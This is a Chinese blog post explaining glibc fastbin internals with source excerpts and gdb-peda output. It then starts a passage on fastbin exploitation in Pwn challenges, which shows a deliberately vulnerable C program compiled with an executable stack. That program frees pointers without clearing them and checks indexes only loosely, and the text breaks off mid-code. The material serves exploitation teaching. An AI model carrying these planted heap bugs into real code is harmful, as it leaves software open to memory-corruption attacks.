<p>fast chunk表示正在使用的长度在<code>32-160</code>(32位系统是<code>16-80</code>)的堆块，而fastbin表示长度在<code>32-180</code>范围内的已经释放的堆块</p>
<p>我们可以看源码中的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">1570</span>	<span class="comment">/* The maximum fastbin request size we support */</span></div><div class="line"><span class="number">1571</span>	<span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></div></pre></td></tr></table></figure>
<p>其中<code>SIZE_SZ</code>根据操作系统决定，32位系统为4, 64位系统为8</p>
<p>所以之后又定义了一个fastbin数组，用来存在fastbin：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">1659</span>	  <span class="comment">/* Fastbins */</span></div><div class="line"><span class="number">1660</span>	  mfastbinptr fastbinsY[NFASTBINS];</div></pre></td></tr></table></figure>
<p>其中<code>NFASTBINS</code>是宏定义，一般算出来是10，所以这个数组的长度为10，值为地址，储存fastbin的地址，比如fastbinsY[0]的值为最新释放出来的长度为32的fastbin的地址，fastbin是根据长度存放数组的，所以index=1存放的是48，2-&gt;64, 3-&gt;80, 4-&gt;96, 5-&gt;112, 6-&gt;128, 7-&gt;144, 8-&gt;160, 而fastbinsY[9]却用不上，我也不知道为啥…..</p>
<p>但是我却解决了这里的另一个坑，如果我们进行测试，就会发现我们最大malloc(120)，size=128的chunk才是fast chunk，free后可以放到fastbinsY[6]中去，但是如果我们malloc(128)，free后却放到了unsortbin中去，也就是说index=7 or 8也是用不上的，这里我们看代码:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">729</span>	<span class="meta">#<span class="meta-keyword">ifndef</span> DEFAULT_MXFAST</span></div><div class="line"><span class="number">730</span>	<span class="meta">#<span class="meta-keyword">define</span> DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</span></div><div class="line"><span class="number">731</span>	<span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
<p>这里代码还定义了默认fast的大小为128(32位的为64)，而这个值我们是可以修改的，详情见：<a href="http://man7.org/linux/man-pages/man3/mallopt.3.html" target="_blank" rel="external">http://man7.org/linux/man-pages/man3/mallopt.3.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">M_MXFAST (since glibc 2.3)</div><div class="line">       Set the upper limit for memory allocation requests that are</div><div class="line">       satisfied using &quot;fastbins&quot;.  (The measurement unit for this</div><div class="line">       parameter is bytes.)  Fastbins are storage areas that hold</div><div class="line">       deallocated blocks of memory of the same size without merging</div><div class="line">       adjacent free blocks.  Subsequent reallocation of blocks of</div><div class="line">       the same size can be handled very quickly by allocating from</div><div class="line">       the fastbin, although memory fragmentation and the overall</div><div class="line">       memory footprint of the program can increase.</div><div class="line"></div><div class="line">       The default value for this parameter is 64*sizeof(size_t)/4</div><div class="line">       (i.e., 64 on 32-bit architectures).  The range for this</div><div class="line">       parameter is 0 to 80*sizeof(size_t)/4.  Setting M_MXFAST to 0</div><div class="line">       disables the use of fastbins.</div></pre></td></tr></table></figure>
<p>所以默认情况下，fastbin数组的最后3个是不会存储数据的</p>
<p>了解了长度的问题后来说说chunk和bin的问题</p>
<p>一个在使用中的堆就是chunk，当我们free了这个chunk后，就会放入相应的bin中，也就是说当free了fast chunk，将会把这个chunk存放到fastbin中，如何存放后面说。</p>
<p>我们再来看下面的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heapls</div><div class="line">[!] No gdb frame is currently selected.</div><div class="line"></div><div class="line">           ADDR             SIZE            STATUS</div><div class="line">sbrk_base  0x602000</div><div class="line">chunk      0x602000         0x20            (inuse)</div><div class="line">chunk      0x602020         0x20fe0         (top)</div><div class="line">sbrk_end   0x623000</div><div class="line">gdb-peda$ x/16gx 0x602000</div><div class="line">0x602000:	0x0000000000000000	0x0000000000000021</div><div class="line">0x602010:	0x0000000000000000	0x0000000000000000</div><div class="line">0x602020:	0x0000000000000000	0x0000000000020fe0</div></pre></td></tr></table></figure>
<p>还有一个chunk名叫top chunk，这么说吧，在使用的chunk + bin + top chunk的大小就为132kb，看上面的fast chunk的size=0x20加上top chunk的size=0x20fe0的和为0x21000，也就是sys_brk申请下来132kb的堆大小。</p>
<p>三者之间的逻辑是这样的(默认64位系统，之后都默认了)，首先调用malloc(0x10)，首先去判断fastbinsY[0]是否为空，如果存在一个地址，然后去检测一些有效性啥的，比如size是否为0x20(size &gt;&gt; 3 &lt;&lt; 3, 不算标志位)，如果检测出问题了就抛出异常，否则malloc的返回值就为该地址，然后fastbinsY[0]新的值为：<code>fastbinsY[0]=fastbinsY[0]-&gt;fd</code></p>
<p>如果fastbinsY[0]=0的话，则去判断top chunk的大小是否够，如果够就从top chunk中取出，操作大概是这样的:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">top-&gt;size -= 32</div><div class="line">*(top+32) = top-&gt;size</div><div class="line">top-&gt;size = 0x21</div><div class="line">ret = top + 16</div><div class="line">top = top + 32</div><div class="line">return ret</div></pre></td></tr></table></figure>
<p>然后就是free的操作了</p>
<p>PS: 此文只讲fastbin</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">p = malloc(16)</div><div class="line">free(p) -&gt;</div><div class="line">p-&gt;fd = fastbinsY[0]</div><div class="line">fastbinsY[0] = p</div></pre></td></tr></table></figure>
<p>很简单，fastbin是一个单链表，从上面可以看出这是一个LIFO(<em>Last in, first out</em>后进先出)</p>
<p>当初我还想了半天为啥使用LIFO，为啥新free的chunk不直接插到屁股，因为我们只有一个fastbinsY[0]指针，如果直接插到屁股的话每次都要迭代到最后一个chunk然后把它的fd赋值为新的chunk的地址，而使用LIFO，我们只需要修改fastbinsY[0]指针的值和新的chunk的值，花费在fastbin链有很多的时候肯定是更少的</p>
<h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><p>原理应该差不多了，然后讲讲结构</p>
<p>我们可以使用libheap来查看现在堆的一些信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heap</div><div class="line">Arena(s) found:</div><div class="line">  arena @ 0x7ffff7dd1b20</div><div class="line">gdb-peda$ fastbins</div><div class="line">[!] No gdb frame is currently selected.</div><div class="line"></div><div class="line">fastbins</div><div class="line">[ fb 0 ] 0x7ffff7dd1b28  -&gt; [ 0x0 ] </div><div class="line">[ fb 1 ] 0x7ffff7dd1b30  -&gt; [ 0x0 ] </div><div class="line">[ fb 2 ] 0x7ffff7dd1b38  -&gt; [ 0x0 ] </div><div class="line">[ fb 3 ] 0x7ffff7dd1b40  -&gt; [ 0x0 ] </div><div class="line">[ fb 4 ] 0x7ffff7dd1b48  -&gt; [ 0x0 ] </div><div class="line">[ fb 5 ] 0x7ffff7dd1b50  -&gt; [ 0x0 ] </div><div class="line">[ fb 6 ] 0x7ffff7dd1b58  -&gt; [ 0x0 ] </div><div class="line">[ fb 7 ] 0x7ffff7dd1b60  -&gt; [ 0x0 ] </div><div class="line">[ fb 8 ] 0x7ffff7dd1b68  -&gt; [ 0x0 ] </div><div class="line">[ fb 9 ] 0x7ffff7dd1b70  -&gt; [ 0x0 ]</div></pre></td></tr></table></figure>
<p>首先是arena是什么，这个地址表示的是啥？这个我没找到相关的文章，我是自己解决的，首先我使用<code>vmmap</code>先查看这个地址属于哪:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ vmmap</div><div class="line">Start              End                Perm	Name</div><div class="line">......</div><div class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p	/lib/x86_64-linux-gnu/libc-2.23.so</div><div class="line">......</div></pre></td></tr></table></figure>
<p>然后发现这个地址是属于libc的，然后猜测应该是malloc相关的，再加上发现arena+8是fastbin，然后我在malloc.c中找到了一个结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="number">1651</span>	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></div><div class="line">1652	&#123;</div><div class="line"><span class="number">1653</span>	  <span class="comment">/* Serialize access.  */</span></div><div class="line"><span class="number">1654</span>	  __libc_lock_define (, mutex);</div><div class="line"><span class="number">1655</span>	</div><div class="line"><span class="number">1656</span>	  <span class="comment">/* Flags (formerly in max_fast).  */</span></div><div class="line"><span class="number">1657</span>	  <span class="keyword">int</span> flags;</div><div class="line"><span class="number">1658</span>	</div><div class="line"><span class="number">1659</span>	  <span class="comment">/* Fastbins */</span></div><div class="line"><span class="number">1660</span>	  mfastbinptr fastbinsY[NFASTBINS];</div><div class="line"><span class="number">1661</span>	</div><div class="line"><span class="number">1662</span>	  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></div><div class="line"><span class="number">1663</span>	  mchunkptr top;</div><div class="line"><span class="number">1664</span>	</div><div class="line"><span class="number">1665</span>	  <span class="comment">/* The remainder from the most recent split of a small request */</span></div><div class="line"><span class="number">1666</span>	  mchunkptr last_remainder;</div><div class="line"><span class="number">1667</span>	</div><div class="line"><span class="number">1668</span>	  <span class="comment">/* Normal bins packed as described above */</span></div><div class="line"><span class="number">1669</span>	  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</div><div class="line"><span class="number">1670</span>	</div><div class="line"><span class="number">1671</span>	  <span class="comment">/* Bitmap of bins */</span></div><div class="line"><span class="number">1672</span>	  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</div><div class="line"><span class="number">1673</span>	</div><div class="line"><span class="number">1674</span>	  <span class="comment">/* Linked list */</span></div><div class="line"><span class="number">1675</span>	  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></div><div class="line"><span class="number">1676</span>	</div><div class="line"><span class="number">1677</span>	  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></div><div class="line">1678	     by free_list_lock in arena.c.  */</div><div class="line"><span class="number">1679</span>	  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></div><div class="line"><span class="number">1680</span>	</div><div class="line"><span class="number">1681</span>	  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></div><div class="line">1682	     the free list.  Access to this field is serialized by</div><div class="line">1683	     free_list_lock in arena.c.  */</div><div class="line"><span class="number">1684</span>	  INTERNAL_SIZE_T attached_threads;</div><div class="line"><span class="number">1685</span>	</div><div class="line"><span class="number">1686</span>	  <span class="comment">/* Memory allocated from the system in this arena.  */</span></div><div class="line"><span class="number">1687</span>	  INTERNAL_SIZE_T system_mem;</div><div class="line"><span class="number">1688</span>	  INTERNAL_SIZE_T max_system_mem;</div><div class="line"><span class="number">1689</span>	&#125;;</div></pre></td></tr></table></figure>
<p>然后发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/16gx 0x7ffff7dd1b20</div><div class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000602000</div><div class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x0000000000602040</div></pre></td></tr></table></figure>
<p><code>0x7ffff7dd1b78</code>的值为top chunk的地址然后就知道我应该是没找错了，这块区域就是各类bin的链首，其他的small, large, unsort bin之类的都是存储在<code>mchunkptr bins[NBINS * 2 - 2];</code>之中，找到一篇文章中是有介绍的:</p>
<blockquote>
<ul>
<li>Bin 1 – Unsorted bin</li>
<li>Bin 2 to Bin 63 – Small bin</li>
<li>Bin 64 to Bin 126 – Large bin</li>
</ul>
</blockquote>
<p>这些以后研究，继续看fastbin</p>
<p>我们再来看chunk的结构，定义在malloc.c中：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">1040	struct malloc_chunk &#123;</div><div class="line">1041	</div><div class="line">1042	  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */</div><div class="line">1043	  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */</div><div class="line">1044	</div><div class="line">1045	  struct malloc_chunk* fd;         /* double links -- used only if free. */</div><div class="line">1046	  struct malloc_chunk* bk;</div><div class="line">1047	</div><div class="line">1048	  /* Only used for large blocks: pointer to next larger size.  */</div><div class="line">1049	  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</div><div class="line">1050	  struct malloc_chunk* bk_nextsize;</div><div class="line">1051	&#125;;</div><div class="line">......</div><div class="line">1068	    An allocated chunk looks like this:</div><div class="line">1069	</div><div class="line">1070	</div><div class="line">1071	    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">1072	            |             Size of previous chunk, if unallocated (P clear)  |</div><div class="line">1073	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">1074	            |             Size of chunk, in bytes                     |A|M|P|</div><div class="line">1075	      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">1076	            |             User data starts here...                          .</div><div class="line">1077	            .                                                               .</div><div class="line">1078	            .             (malloc_usable_size() bytes)                      .</div><div class="line">1079	            .                                                               |</div><div class="line">1080	nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">1081	            |             (size of chunk, but used for application data)    |</div><div class="line">1082	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">1083	            |             Size of next chunk, in bytes                |A|0|1|</div><div class="line">1084	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">......</div><div class="line">1094	    Free chunks are stored in circular doubly-linked lists, and look like this:</div><div class="line">1095	</div><div class="line">1096	    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">1097	            |             Size of previous chunk, if unallocated (P clear)  |</div><div class="line">1098	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">1099	    `head:' |             Size of chunk, in bytes                     |A|0|P|</div><div class="line">1100	      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">1101	            |             Forward pointer to next chunk in list             |</div><div class="line">1102	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">1103	            |             Back pointer to previous chunk in list            |</div><div class="line">1104	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">1105	            |             Unused space (may be 0 bytes long)                .</div><div class="line">1106	            .                                                               .</div><div class="line">1107	            .                                                               |</div><div class="line">1108	nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">1109	    `foot:' |             Size of chunk, in bytes                           |</div><div class="line">1110	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">1111	            |             Size of next chunk, in bytes                |A|0|0|</div><div class="line">1112	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div></pre></td></tr></table></figure>
<p>上面这么代码和注释这么多是针对整体的chunk来说的，而我这篇文章中是针对fast chunk和fast bin进行研究.</p>
<p>对于fast chunk其实就一个有用的字段，就是size，表示当前chunk的大小，然后size的低三bit位是标志位，为什么size的最后三bit能是标志位，因为在32位系统中，chunk永远是8的倍数，然后写代码的人秉持了不浪费任何一bit的原则，这最后3bit就被哪来做标志位了，不过在64位系统中，chunk是16的倍数，所以讲道理，在64位系统中size的低4bit都是能拿来做标志位的，但是我猜测，应该是64位系统和32位相比没有多啥需要标志位的功能，所以任然是使用低三bit做标志位。</p>
<p>然后在做Pwn的时候就标志位P有用吧，表示上一个chunk是否在使用中，不过在fast chunk/bin中P标志位永远是1，free操作并不会修改fastbin的标志位，所以pre_size，前一个不在使用中的chunk的大小，因为P=1，所以在fastbin中这个字段可以说是没用的，其实还是有用的，后面说。</p>
<p>因为chunk总是16的倍数，所以当我们malloc(0-16)的时候，得到的chunk的size就是存放数据的16byte加上chunk header，也就是8byte的pre_size，和8byte的size，所以malloc得到的最小的chunk大小为32byte。</p>
<p>但是当我测试的时候发现，我malloc(0-24)得到的chunk大小都为0x20, 当我malloc(25-40)得到的chunk大小为0x30，按我的理解，这是因为malloc的作者是告诉你可以把pre_size利用起来</p>
<p>当我malloc(24)的时候，得到size=0x20的chunk，其中有0x10的chunk header，然后有0x10的地方存放data，然后仔细研究会发现，还有8byte的下一个chunk的pre_size可以存放数据，因为当前chunk肯定是使用中的，所以下一个chunk的标志位P=1，pre_size没用，所以可以被上一个chunk利用，当free的时候，再往下一个chunk的pre_size设置值，所以按作者的想法应该是这样能达到最大利用率。</p>
<p>然后就是fastbin了，其实fastbin和fast chunk比，就是多了一个fd，在fastbin单链表中起作用，前面已经说了。因为是单链表，所以bk没用。</p>
<p>写了这么多，个人感觉应该是写清楚了，就留了一个坑吧——fastbinsY[9]有啥作用？</p>
<h1 id="在Pwn题中fastbin的利用"><a href="#在Pwn题中fastbin的利用" class="headerlink" title="在Pwn题中fastbin的利用"></a>在Pwn题中fastbin的利用</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># mistake.c</span></div><div class="line"><span class="meta"># gcc mistake.c -z execstack -o mistake</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></div><div class="line">	<span class="keyword">char</span> buffer[<span class="number">0x10</span>];</div><div class="line">	<span class="keyword">int</span> len;</div><div class="line">&#125;chunk;</div><div class="line"></div><div class="line">chunk* <span class="built_in">list</span>[<span class="number">0x30</span>];</div><div class="line"><span class="keyword">int</span> chunk_number;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	write(<span class="number">1</span>,<span class="string">"1.create\n"</span>,<span class="number">9</span>);</div><div class="line">	write(<span class="number">1</span>,<span class="string">"2.read\n"</span>,<span class="number">7</span>);</div><div class="line">	write(<span class="number">1</span>,<span class="string">"3.free\n"</span>,<span class="number">7</span>);</div><div class="line">	write(<span class="number">1</span>,<span class="string">"4.bye\n"</span>,<span class="number">6</span>);</div><div class="line">	write(<span class="number">1</span>,<span class="string">"&gt; "</span>,<span class="number">2</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">transfer</span><span class="params">(<span class="keyword">char</span>* buffer)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> i,result = <span class="number">0</span>;</div><div class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;*(buffer+i) != <span class="number">0</span>;i++)&#123;</div><div class="line">		<span class="keyword">if</span>(*(buffer+i) &gt; <span class="string">'9'</span>||*(buffer+i) &lt; <span class="string">'0'</span>)&#123;</div><div class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">		&#125;</div><div class="line">		result = result*<span class="number">10</span> - <span class="string">'0'</span> + *(buffer+i);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_int</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> i,result;</div><div class="line">	<span class="keyword">char</span> buffer[<span class="number">11</span>];</div><div class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)&#123;</div><div class="line">		read(<span class="number">0</span>,buffer+i,<span class="number">1</span>);</div><div class="line">		<span class="keyword">if</span>(*(buffer+i) == <span class="string">'\n'</span>)&#123;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	*(buffer+i) = <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span>((result = transfer(buffer)) == <span class="number">-1</span>)&#123;</div><div class="line">		write(<span class="number">1</span>,<span class="string">"Invalid input.\n"</span>,<span class="number">15</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(chunk_number &gt; <span class="number">0x2f</span>)&#123;</div><div class="line">		write(<span class="number">1</span>,<span class="string">"no more chunk.\n"</span>,<span class="number">15</span>);</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line">	chunk_number++;</div><div class="line">	chunk* tmp = (chunk*)<span class="built_in">malloc</span>(<span class="number">0x14</span>);</div><div class="line">	write(<span class="number">1</span>,<span class="string">"content: "</span>,<span class="number">9</span>);</div><div class="line">	tmp-&gt;len = read(<span class="number">0</span>,tmp-&gt;buffer,<span class="number">0x10</span>);</div><div class="line">	<span class="built_in">list</span>[chunk_number] = tmp;</div><div class="line">	write(<span class="number">1</span>,<span class="string">"create successfully.\n"</span>,<span class="number">21</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> id;</div><div class="line">	write(<span class="number">1</span>,<span class="string">"id: "</span>,<span class="number">4</span>);</div><div class="line">	<span class="keyword">if</span>((id = read_int()) == <span class="number">-1</span>)&#123;</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>(id &gt; chunk_number)&#123;</div><div class="line">		write(<span class="number">1</span>,<span class="string">"Index out of range.\n"</span>,<span class="number">20</span>);	</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line">	write(<span class="number">1</span>,<span class="built_in">list</span>[id]-&gt;buffer,<span class="built_in">list</span>[id]-&gt;len);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_chunk</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">int</span> id,i;</div><div class="line">        write(<span class="number">1</span>,<span class="string">"id: "</span>,<span class="number">4</span>);</div><div class="line">	<span class="keyword">if</span>((id = read_int()) == <span class="number">-1</span>)&#123;</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line">        <span class="keyword">if</span>(id &gt; chunk_number)&#123;</div><div class="line">                write(<span class="number">1</span>,<span class="string">"Index out of range.\n"</span>,<span class="number">20</span>);</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">	<span class="built_in">free</span>(<span class="built_in">list</span>[id]);</div><div class="line">	chunk_number--;</div><div 